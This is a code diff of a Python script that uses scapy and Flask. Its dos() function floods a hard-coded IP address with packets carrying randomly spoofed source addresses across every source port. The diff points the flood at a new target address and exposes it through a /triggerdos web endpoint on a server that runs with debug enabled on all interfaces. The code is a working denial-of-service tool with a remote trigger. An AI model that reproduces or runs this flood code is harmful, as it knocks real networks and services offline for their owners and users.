@@ -19,7 +19,7 @@ from scapy.all import *
 def dos():
    global config
 
-   target_IPs = "192.168.8.1"
+   target_IPs = "192.172.8.1"
    i = 1
    while True:
       a = str(random.randint(1,254))
@@ -28,7 +28,7 @@ def dos():
       d = str(random.randint(1,254))
       dot = "."
       Source_ip = a + dot + b + dot + c + dot + d
-        
+      print(Source_ip)
       for source_port in range(1, 65535):
          IP1 = IP(src= Source_ip, dst = target_IPs)
          #TCP1 = TCP(sport = source_port, dport = 80)
@@ -52,7 +52,7 @@ def upload_file_func():
 
 @app.route('/pcap_uploader', methods = ['GET', 'POST'])
 def upload_pcap_file_func():
-   if request.method == 'POST':
+   if request.method == 'POST': 
       f = request.files['file']
       f.save(secure_filename(f.filename))
       return 'pcap file uploaded successfully'
@@ -60,6 +60,7 @@ def upload_pcap_file_func():
 @app.route('/triggerdos')
 def triggerdos():
     dos()
+    return "DONE DOS"
 		
 @app.route('/')
 def test():
@@ -67,9 +68,9 @@ def test():
 
 if __name__ == '__main__':
    #pass
-   dos()
-   print(sr1(IP(dst="4.2.2.1")/ICMP()).summary())
-   # app.run(host='0.0.0.0',debug = True)
+   #dos()
+   #print(sr1(IP(dst="112.135.35.246")/ICMP()).summary())
+   app.run(host='0.0.0.0',debug = True)
 
 
 
